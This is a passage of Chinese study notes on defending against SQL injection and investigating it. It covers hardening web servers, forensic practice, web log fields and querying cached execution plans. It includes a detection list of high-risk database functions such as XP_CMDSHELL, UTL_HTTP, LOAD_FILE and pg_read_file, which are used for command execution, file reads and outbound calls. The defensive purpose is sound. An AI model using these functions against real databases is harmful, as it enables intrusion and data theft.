&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;IIS服务器&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;可以使用下列操作配置IIS中的自定义错误：&lt;br&gt;（1）在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。&lt;br&gt;（2）在”Custom Errors”选项卡中单击”Configuration”按钮。选中需要自定义的HTTP错误并单击”Edit”按钮。接下来从”Message Type”&lt;br&gt;下拉菜单中选择一个文件或URL来替换默认内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;一种可以使基于响应的错误检测变得困难的方法，是配置应用程序和Web服务器，使之返回相同的响应，比如不管什么错误代码（401、403、500等）均重定向到默认的首页。&lt;/p&gt;
&lt;h5 id=&#34;使用空的默认Web站点&#34;&gt;&lt;a href=&#34;#使用空的默认Web站点&#34; class=&#34;headerlink&#34; title=&#34;使用空的默认Web站点&#34;&gt;&lt;/a&gt;使用空的默认Web站点&lt;/h5&gt;&lt;p&gt;HTTP/1.1协议要求HTTP客户端在发送给Web服务器的请求中发送主机头部（Host header）。为访问特定的Web站点，该头部值必须与Web服务器的虚拟主机配置中的主机名相匹配。如果未找到匹配值，将返回默认的Web站点内容。&lt;/p&gt;
&lt;p&gt;对于企业级Web应用程序的拥有者，则可能更喜欢隐蔽起来，他们不希望被针对端口80和443进行IP地址范围扫描的攻击者发现。为确保用户只能通过主机名连接到Web应用，需要将Web服务器的默认Web站点配置成返回一个空白的默认Web页面。&lt;/p&gt;
&lt;h5 id=&#34;为DNS反向查询使用虚拟主机名称&#34;&gt;&lt;a href=&#34;#为DNS反向查询使用虚拟主机名称&#34; class=&#34;headerlink&#34; title=&#34;为DNS反向查询使用虚拟主机名称&#34;&gt;&lt;/a&gt;为DNS反向查询使用虚拟主机名称&lt;/h5&gt;&lt;p&gt;前面讲过，如果只拥有IP地址，要想在能够访问Web站点之前发现有效的主机名，就需要花费一些功夫。要实现该目标，一种方法是在IP地址上执行反向DNS查询。如果IP地址被解析成在Web服务器上同样有效的主机名，那么我们就拥有了连接到该Web站点所需要的信息。不过，如果反向查询返回了稍微通用的内容，那么这时可通过反向DNS查询来阻止不受欢迎的攻击者发现我们的Web站点。如果正在使用虚拟主机名（Dummy Host Name）技术，请确保默认的Web站点也被配置成返回一个空白的默认Web页面。&lt;/p&gt;
&lt;h5 id=&#34;使用通配符SSL证书&#34;&gt;&lt;a href=&#34;#使用通配符SSL证书&#34; class=&#34;headerlink&#34; title=&#34;使用通配符SSL证书&#34;&gt;&lt;/a&gt;使用通配符SSL证书&lt;/h5&gt;&lt;p&gt;另一种发现有效主机名的方法是从SSL（Secure Sockets Layer,安全套接字层）证书中提取。 要阻止该操作，一种方法是使用通配符SSL证书。&lt;/p&gt;
&lt;h5 id=&#34;限制通过搜索引擎hacking得到的发现&#34;&gt;&lt;a href=&#34;#限制通过搜索引擎hacking得到的发现&#34; class=&#34;headerlink&#34; title=&#34;限制通过搜索引擎hacking得到的发现&#34;&gt;&lt;/a&gt;限制通过搜索引擎hacking得到的发现&lt;/h5&gt;&lt;p&gt;搜索引擎是攻击者用于寻找Web站点中SQL注入漏洞的另一种工具。在所有主流搜索引擎中，常见的技术是使用Web站点根目录中的robots.txt文件。该文件用于阻止爬行器（crawler）编写站点索引。&lt;/p&gt;
&lt;p&gt;阻止所有机器人爬行Web站点上的所有页面：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-txt&#34; data-language=&#34;txt&#34;&gt;&lt;code class=&#34;language-txt&#34;&gt;User-agent: *
Disallow: /&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;禁止WSDL信息&#34;&gt;&lt;a href=&#34;#禁止WSDL信息&#34; class=&#34;headerlink&#34; title=&#34;禁止WSDL信息&#34;&gt;&lt;/a&gt;禁止WSDL信息&lt;/h5&gt;&lt;p&gt;Web服务所支持的通信协议（例如，SOAP、HTTP GET等）、方法名和期望的参数，都可以从Web服务的WSDL（Web Services Description Language, Web服务描述语言）文件中提取到。通常，通过在Web服务URL的结尾添加一个?WSDL来调用该文件。好的做法是尽可能向不受欢迎的攻击者隐藏这一信息。&lt;/p&gt;
&lt;p&gt;下面展示了如何配置一个.NET Web服务以便不显示WSDL，可以对该配置进行修改以便应用到应用的web.config或machine.config文件中：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;webServices&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;protocols&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;remove&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;Documentation&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;protocols&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;webServices&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Apache Axis（Java应用经常使用的一种SOAP（简单对象访问协议，Web服务平台）支持自定义配置WSDL文件，用于阻止自动生成WSDL，可以在服务的WSDD（Web服务描述文档）文件中配置wsdlFile设置以指向返回空&lt;code&gt;&amp;lt;wsdl/&amp;gt;&lt;/code&gt;标签的文件。&lt;/p&gt;
&lt;p&gt;坚决反对在面向Internet的Web服务器上保持WSDL信息的远程访问。可以使用可选的安全通信通道（比如加密过的e-mail）来向值得信赖的合作者提供该文件，合作者可能需要这些信息以与Web服务进行通信。&lt;/p&gt;
&lt;h4 id=&#34;提高Web服务器日志的详细程度&#34;&gt;&lt;a href=&#34;#提高Web服务器日志的详细程度&#34; class=&#34;headerlink&#34; title=&#34;提高Web服务器日志的详细程度&#34;&gt;&lt;/a&gt;提高Web服务器日志的详细程度&lt;/h4&gt;&lt;p&gt;Web服务器日志文件可以提供一些洞察潜在SQL注入攻击的信息，尤其是当应用程序日志记录机制不佳时。&lt;/p&gt;
&lt;h4 id=&#34;将Web服务器和数据库服务器分别部署在独立主机上&#34;&gt;&lt;a href=&#34;#将Web服务器和数据库服务器分别部署在独立主机上&#34; class=&#34;headerlink&#34; title=&#34;将Web服务器和数据库服务器分别部署在独立主机上&#34;&gt;&lt;/a&gt;将Web服务器和数据库服务器分别部署在独立主机上&lt;/h4&gt;&lt;p&gt;应该避免在同一主机上运行Web服务器软件和数据库服务器软件，因为这样会显著增加Web应用的攻击面，并将之前只访问Web前端时不可能暴露的数据库服务器软件暴露给攻击程序。&lt;/p&gt;
&lt;h4 id=&#34;配置网络访问控制&#34;&gt;&lt;a href=&#34;#配置网络访问控制&#34; class=&#34;headerlink&#34; title=&#34;配置网络访问控制&#34;&gt;&lt;/a&gt;配置网络访问控制&lt;/h4&gt;&lt;p&gt;在分层正确的网络中，数据库服务器通常位于内部受信任网络中。凭借对数据库服务器的直接访问权，攻击者可以尝试连接到同一网络的其他系统。 实现网络访问控制，以便对与内部网中其他系统的连接施加限制。可以在包含防火墙和路由器 ACL的网络层实现该控制，也可以使用IPSec这样的主机层机制来实现该控制。此外，确保施加合适的网络访问控制以阻止带外（outbound）网络连接。&lt;/p&gt;
&lt;h2 id=&#34;确认并从SQL注入攻击中恢复&#34;&gt;&lt;a href=&#34;#确认并从SQL注入攻击中恢复&#34; class=&#34;headerlink&#34; title=&#34;确认并从SQL注入攻击中恢复&#34;&gt;&lt;/a&gt;确认并从SQL注入攻击中恢复&lt;/h2&gt;&lt;h3 id=&#34;调查可疑的SQL注入攻击&#34;&gt;&lt;a href=&#34;#调查可疑的SQL注入攻击&#34; class=&#34;headerlink&#34; title=&#34;调查可疑的SQL注入攻击&#34;&gt;&lt;/a&gt;调查可疑的SQL注入攻击&lt;/h3&gt;&lt;p&gt;在遇到可疑的攻击之后，调查者需要筛选大量信息，不但需要判断是否存在SQL注入攻击企图的证据，还需要判断这种攻击是否成功。&lt;/p&gt;
&lt;h4 id=&#34;取证的合理实践&#34;&gt;&lt;a href=&#34;#取证的合理实践&#34; class=&#34;headerlink&#34; title=&#34;取证的合理实践&#34;&gt;&lt;/a&gt;取证的合理实践&lt;/h4&gt;&lt;p&gt;收集和管理数字化的证据都有着严格的规则和指导原则。常见的要求包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;应该由接受过计算机取证培训并在机构中授权执行数字调查的人来处理调查事宜。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在调查期间收集的所有文件，应该镜像，并且应该创建镜像的副本用于分析。这可以确保在需要时总有原始镜像可用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;对于新创建的每一份文件镜像，应该为之生成哈希，对于每个源文件也是如此。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在调查期间，用文档记录你所执行的所有操作，包括那些当连接到数据库服务器时完成的操作：保留连接时间和所用数据库语境的记录；保留在RDBMS中执行命令的记录；将所有结果管道(pipe)重定向到文本文件中。主流RDBMS客户端将标准输出重定向的命令。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;确保将所有证据都写入无毒的存储介质，并将其保存在一个安全的地方，比如储物柜或保险箱。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;维护一份监管链(Chain of Custody)文档，用于跟踪收集的所有证据，从被防护时间开始直到作为证据在法庭上呈现时的移动、存放位置和所有者。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;主流RDBMS客户端重定向stdout的命令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;RDBMS&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;厂商支持的客户端&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;日志记录的会话活动&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;重定向操作符&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Microsoft  SQL Server&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;SQLCMD&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;-e命令，当启动SQLCMD时， 它在标准输出(stdout)上回显所有发送给服务器的语句和查询。例如：&lt;br&gt;  &lt;code&gt;SQLCMD  -e&lt;/code&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;控制台中使用:out输出命令，将把标准输出(stdout)重定向到指定的文件。例如：&lt;br&gt;&lt;code&gt;SQLCMD&amp;gt;:out  z:\queryresults.txt  &amp;lt;query&amp;gt;  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Oracle&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;SQL*Plus&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在SQL*Plus中使用 ECHO  ON命令。例如：&lt;br&gt;  &lt;code&gt;SQL&amp;gt; SET ECHO ON  &lt;/code&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在SQL*Plus中使用spool命令。  例如： &lt;br&gt; &lt;code&gt;SQL&amp;gt; spool  z:\queryresults.txt&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;MySQL&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;MySQL命令行客户端&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Tee选项。  例如： &lt;br&gt;&lt;code&gt;Tee z:\response\  logofactions.txt&lt;/code&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;INTO OUTFILE 语句。  例如：&lt;br&gt;  &lt;code&gt;&amp;lt;query&amp;gt; INTO  OUTFILE z:\queryresults.txt&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;PostgreSQL&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PostgreSQL  shell&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在 PostgreSQL  中使用  ECHO  选项。  例如：&lt;br&gt;  &lt;code&gt;\set ECHO all  &lt;/code&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;在PostgreSQL  shell中使用/g参数。 例如：&lt;br&gt; &lt;code&gt;=# &amp;lt;query&amp;gt;  /g z:\queryresults.txt&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;分析数字化证据&#34;&gt;&lt;a href=&#34;#分析数字化证据&#34; class=&#34;headerlink&#34; title=&#34;分析数字化证据&#34;&gt;&lt;/a&gt;分析数字化证据&lt;/h4&gt;&lt;p&gt;数字化证据(digital artifact)就是相关数据的集合。它们的范围很广，包括从存储在操作系统中文件系统内的Web服务器的日志文件，到存储在内存中的信息，以及RDBMS内核中的信息。&lt;/p&gt;
&lt;h5 id=&#34;Web服务器日志文件&#34;&gt;&lt;a href=&#34;#Web服务器日志文件&#34; class=&#34;headerlink&#34; title=&#34;Web服务器日志文件&#34;&gt;&lt;/a&gt;Web服务器日志文件&lt;/h5&gt;&lt;p&gt;Web服务器是基于Web的应用程序的核心组件，作为交互层接受用户的输入并将输入传递给后台应用程序。Web服务器通常维护着持久日志文件，其中包含它接收到的页面请求的历史记录，以及以状态码形式记录的对该请求处理后产生的输出。&lt;/p&gt;
&lt;p&gt;对于调查SQL注入攻击最有用的Web服务器日志属性&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;日志字段名&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;描述&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;主要调查的值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Date&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;活动的日期&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;建立事件的时间基线，并在各种证据中将事件关联起来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Time&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;活动的时间&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;建立事件的时间基线，并在各种证据中将事件关联起来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Client-IP Address (c-ip)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;发起请求的客户端的IP地址&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识Web请求的源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs-UserName&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;发起请求的已授权的用户名&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识与流量关联的用户上下文(context)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs-method&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;请求的操作(action)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端试图执行的HTTP操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs-uri-stem&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;请求目标(例如请求的Web页面)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端请求访问的资源(页面、可执行文件等)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs-uri-query&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端请求的查询&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识客户端提交的恶意查询&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Sc-status&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端请求的状态码&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识处理客户端请求后产生的输出  (状态)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs(User-Agent)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端浏览器的版本&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;追踪特定客户端的请求，该客户端可 能使用了多个IP地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Cs-bytes&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;客户端发送给服务器的字节&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识异常的流量传输&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Sc-bytes&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;服务器发送给客户端的字节&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识异常的流量传输&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Time Taken (time-taken)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;服务器执行请求所花的毫秒数&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;标识异常请求处理的实例&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;分析日志文件的要点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每天的带宽利用率&lt;/li&gt;
&lt;li&gt;页面每天命中次数&lt;/li&gt;
&lt;li&gt;页面每天被每个IP命中的次数&lt;/li&gt;
&lt;li&gt;恶意查询参数&lt;/li&gt;
&lt;li&gt;spear-searching&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;数据库执行计划&#34;&gt;&lt;a href=&#34;#数据库执行计划&#34; class=&#34;headerlink&#34; title=&#34;数据库执行计划&#34;&gt;&lt;/a&gt;数据库执行计划&lt;/h5&gt;&lt;p&gt;数据库执行计划是由RDBMS生成的执行步骤的列表，它说明了 RDBMS在访问或修改信息时效率最高的方式。&lt;/p&gt;
&lt;h6 id=&#34;在缓存的执行计划中查找证据&#34;&gt;&lt;a href=&#34;#在缓存的执行计划中查找证据&#34; class=&#34;headerlink&#34; title=&#34;在缓存的执行计划中查找证据&#34;&gt;&lt;/a&gt;在缓存的执行计划中查找证据&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;寻找已知恶意攻击活动的痕迹&lt;/li&gt;
&lt;li&gt;与注释协同使用的堆叠查询&lt;/li&gt;
&lt;li&gt;非法使用条件语句&lt;/li&gt;
&lt;li&gt;高风险语句和数据库函数&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据库&lt;/th&gt;
&lt;th&gt;函  数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Microsoft SQL Server&lt;/td&gt;
&lt;td&gt;XP_CMDSHELL&lt;br&gt;XP_reg*&lt;br&gt;SP_OACREATE&lt;br&gt;sp_OAMethod&lt;br&gt;OPENROWSET&lt;br&gt;sp_configure&lt;br&gt;BULK INSERT&lt;br&gt;BCP&lt;br&gt;WAITFOR DELAY&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;UTL_FILE&lt;br&gt;UTL_HTTP&lt;br&gt;HTTPURITYPE&lt;br&gt;UTL_INADDR&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;LOAD_DATA_INFILE&lt;br&gt;LOAD_FILE&lt;br&gt;BENCHMARK&lt;br&gt;ENCODE()&lt;br&gt;OUTFILE()&lt;br&gt;CONCAT()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;pg_Is_dir&lt;br&gt;pg_read_file&lt;br&gt;pg_read_binary_file&lt;br&gt;pg_stat_file&lt;br&gt;pg_sleep&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h6 id=&#34;如何访问执行计划&#34;&gt;&lt;a href=&#34;#如何访问执行计划&#34; class=&#34;headerlink&#34; title=&#34;如何访问执行计划&#34;&gt;&lt;/a&gt;如何访问执行计划&lt;/h6&gt;&lt;p&gt;RDBMS数据库提供的视图，用于访问存储的执行计划&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据库&lt;/th&gt;
&lt;th&gt;缓存的语句类型&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;默认是否启用&lt;/th&gt;
&lt;th&gt;访问方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Microsoft SQL Server&lt;/td&gt;
&lt;td&gt;即席奪询(ad  hoc)和预处理语句(prepared  statement)&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;启用&lt;/td&gt;
&lt;td&gt;sys.dmexecquerystats  sys.dmexecsqltext&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;即席查询（ad hoc）和预处理语句&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;启用&lt;/td&gt;
&lt;td&gt;gv$sql&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;预处理语句&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;不启用&lt;/td&gt;
&lt;td&gt;没有直接访问方法，使用普通的日志查询&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;预处理语句&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;不启用&lt;/td&gt;
&lt;td&gt;没有直接访问方法，使用普通的日志查询&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft SQL Server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  使用视图返回了执行计划缓存条目创建的日期和时间、最后一次执行的时间（在重复执行的情况下）、执行的语法和执行计划被重用的次数&lt;/p&gt;
  &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; creation_time&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; last_execution_time&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; execution_count &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dm_exec_query_stats qs &lt;span class=&#34;token keyword&#34;&gt;CROSS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;APPLY&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dm_exec_sql_text&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;qs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_handle&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Oracle &lt;/p&gt;
&lt;p&gt;使用GVSSQL视图&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sql_text &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; gv$&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MySQL&lt;/p&gt;
&lt;p&gt;使用show variables命令来查看查询日志的状态&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; variables &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%general_log%&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PostgreSQL&lt;/p&gt;
&lt;p&gt;使用下面的查询来判断服务器上的log_statement值是否已经启用，如果已经启用，可以看到曰志的位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; setting &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_settings &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;log_statement&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;log_directory&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;log_filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;执行计划的局限&#34;&gt;&lt;a href=&#34;#执行计划的局限&#34; class=&#34;headerlink&#34; title=&#34;执行计划的局限&#34;&gt;&lt;/a&gt;执行计划的局限&lt;/h6&gt;&lt;p&gt;在PostgreSQL和MySQL中，执行计划默认是被禁用的。除此之外，具有足够权限的攻击者还可以禁用执行计划。Microsoft SQL Server和Oracle不允许禁用执行计划，但是执行计划受到本地RDBMS回收策略的支配，使用特殊的RDBMS函数可以将执行计划清洗掉。&lt;/p&gt;
&lt;h6 id=&#34;缓存回收策略&#34;&gt;&lt;a href=&#34;#缓存回收策略&#34; class=&#34;headerlink&#34; title=&#34;缓存回收策略&#34;&gt;&lt;/a&gt;缓存回收策略&lt;/h6&gt;&lt;p&gt;可以控制执行计划缓存的存储容量。RDBMS会根据一些因素来清除缓存的条目&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;数据库服务器的CPU和内存负载&lt;/p&gt;
&lt;/li&gt;
